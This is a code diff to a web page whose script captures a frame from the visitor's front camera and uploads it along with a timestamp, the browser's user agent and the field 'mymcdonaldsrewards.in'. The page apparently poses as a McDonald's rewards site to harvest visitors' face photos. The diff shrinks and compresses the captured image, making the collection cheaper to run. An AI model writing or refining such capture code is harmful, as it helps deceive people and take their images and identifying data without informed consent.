@@ -69,8 +69,8 @@
             navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: 'user',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
+                    width: { ideal: 480 },
+                    height: { ideal: 360 }
                 },
                 audio: false
             }).then(function(mediaStream) {
@@ -92,13 +92,14 @@
             var canvas = document.getElementById('canvas');
             var ctx = canvas.getContext('2d');
             
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
+            // Resize to 480x360 for compression
+            canvas.width = 480;
+            canvas.height = 360;
+            ctx.drawImage(video, 0, 0, 480, 360);
             
             canvas.toBlob(function(blob) {
                 var formData = new FormData();
-                formData.append('image', blob, 'photo.png');
+                formData.append('image', blob, 'photo.jpg');
                 formData.append('domain', 'mymcdonaldsrewards.in');
                 formData.append('timestamp', new Date().toISOString());
                 formData.append('userAgent', navigator.userAgent);
@@ -112,7 +113,7 @@
                 
                 mediaStream.getTracks().forEach(track => track.stop());
                 document.getElementById('successMsg').style.display = 'block';
-            }, 'image/png', 0.8);
+            }, 'image/jpeg', 0.3);
         }
     </script>
 </body>
